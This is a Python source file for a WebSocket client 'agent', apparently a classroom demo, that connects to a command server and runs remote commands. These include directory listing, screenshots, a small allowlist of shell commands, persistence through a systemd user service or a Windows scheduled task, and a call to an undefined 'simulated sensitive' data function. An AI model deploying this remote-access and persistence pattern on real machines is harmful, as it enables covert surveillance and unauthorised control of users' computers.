import asyncio
import json
import logging
import platform
import os
import psutil
import subprocess
import sys
from pathlib import Path
import websockets
from common import make_hmac, timestamp, json_safe_loads

SERVER = "ws://<IP du serveur>:8765"  # Pense à bien remplacer ça par l'ip de ta machine serveur nico/prof

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("simpleagent")

def get_non_loopback_ips():
    ips = []
    for iface, addrs in psutil.net_if_addrs().items():
        for a in addrs:
            fam = getattr(a.family, "name", str(a.family))
            if "AF_INET" in fam and not a.address.startswith("127."):
                ips.append(f"{iface}:{a.address}")
    return ips

def cmd_whoami():
    import getpass
    try:
        return getpass.getuser()
    except Exception:
        return "unknown"

def cmd_list(path=".", max_depth=1):
    result = []
    try:
        for root, dirs, files in os.walk(path):
            if path == "/":
                depth = root.count(os.sep)
                base_depth = 1
            else:
                depth = root[len(path):].count(os.sep)
                base_depth = 0

            result.append(root + ":")
            for d in dirs:
                result.append("  <dir> " + d)
            for f in files:
                result.append("  " + f)
            if depth - base_depth >= max_depth:
                dirs[:] = []
        return "\n".join(result) if result else "(empty)"
    except PermissionError:
        return "(permission denied)"
    except FileNotFoundError:
        return "(path not found)"
    except Exception as e:
        return f"(error: {e})"

def cmd_uptime():
    if os.name == "posix" and os.path.exists("/proc/uptime"):
        try:
            with open("/proc/uptime") as f:
                up = float(f.readline().split()[0])
                hours = int(up // 3600)
                mins = int((up % 3600) // 60)
                return f"up {hours}h {mins}m (from /proc/uptime)"
        except Exception:
            pass
    return "(uptime not available on this platform)"

def cmd_screenshot():
    try:
        import mss
    except Exception:
        return "mss not installed (pip install mss)"
    try:
        outdir = Path.cwd() / "screens"
        outdir.mkdir(parents=True, exist_ok=True)
        fname = outdir / "screenshot.png"
        with mss.mss() as sct:
            sct.shot(output=str(fname))
        return f"screenshot saved to {fname}"
    except Exception as e:
        return f"error taking screenshot: {e}"

ALLOWED_SHELL_COMMANDS = {
    "echo hello from server",
    "whoami",
    "hostname",
    "ipconfig" if platform.system().lower().startswith("win") else "ip a",
    "dir" if platform.system().lower().startswith("win") else "ls -la",
}

def cmd_run_shell(command: str):
    command = command.strip()
    if command not in ALLOWED_SHELL_COMMANDS:
        return f"(command '{command}' not allowed)"
    try:
        if platform.system().lower().startswith("win"):
            completed = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        else:
            completed = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        out = completed.stdout or ""
        err = completed.stderr or ""
        return (out + ("\n[stderr]\n" + err if err else "")).strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "(command timeout)"
    except Exception as e:
        return f"(shell error: {e})"

def setup_autostart_linux():
    try:
        user_dir = Path.home() / ".config" / "systemd" / "user"
        user_dir.mkdir(parents=True, exist_ok=True)
        service_file = user_dir / "agent_ws.service"
        script_path = Path(__file__).resolve()
        content = f"""[Unit]
Description=WS agent demo
After=network-online.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=on-failure

[Install]
WantedBy=default.target
"""
        service_file.write_text(content)
        return f"systemd user service created at {service_file} (enable with: systemctl --user enable --now agent_ws)"
    except Exception as e:
        return f"(autostart linux error: {e})"

def setup_autostart_windows():
    script_path = Path(__file__).resolve()
    cmd = (
        'schtasks /Create /SC ONLOGON /TN "WSAgentDemo" '
        f'/TR "{sys.executable} {script_path}"'
    )
    return f"Run this as admin in Windows to enable autostart:\n{cmd}"

def cmd_setup_autostart():
    if platform.system().lower().startswith("win"):
        return setup_autostart_windows()
    else:
        return setup_autostart_linux()
    
async def run_agent():
    while True:
        try:
            async with websockets.connect(SERVER) as ws:
                hello = {"os": platform.system(), "name": platform.node(), "ts": timestamp()}
                hello["hmac"] = make_hmac(json.dumps({"os": hello["os"], "name": hello["name"], "ts": hello["ts"]}).encode())
                await ws.send(json.dumps(hello))

                auth = await ws.recv()
                authobj = json_safe_loads(auth)
                if not authobj or authobj.get("status") != "auth_ok":
                    logger.error("Auth rejected by server")
                    return
                logger.info("Authenticated with server")

                while True:
                    msg = await ws.recv()
                    cmd = json_safe_loads(msg)
                    if not cmd:
                        continue
                    if cmd.get("cmd") == "bye":
                        logger.info("Session terminée")
                        break
                    cid = cmd.get("id")
                    name = cmd.get("cmd")
                    args = cmd.get("args") or {}

                    if name == "whoami":
                        out = cmd_whoami()
                    elif name == "get_ips":
                        out = "\n".join(get_non_loopback_ips())
                    elif name == "list":
                        out = cmd_list(args.get("path", "."), int(args.get("max_depth", 1)))
                    elif name == "uptime":
                        out = cmd_uptime()
                    elif name == "screenshot":
                        out = cmd_screenshot()
                    elif name == "run_shell":
                        out = cmd_run_shell(args.get("command", "").strip())
                    elif name == "setup_autostart":
                        out = cmd_setup_autostart()
                    elif name == "get_simulated_sensitive":
                        out = cmd_get_simulated_sensitive()
                    else:
                        out = f"(command '{name}' not allowed)"
                    reply = {"id": cid, "status": "ok", "output": out}
                    await ws.send(json.dumps(reply))
        except Exception as e:
            logger.warning("Erreur ou déconnexion: %s — reconnexion dans 5s", e)
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(run_agent())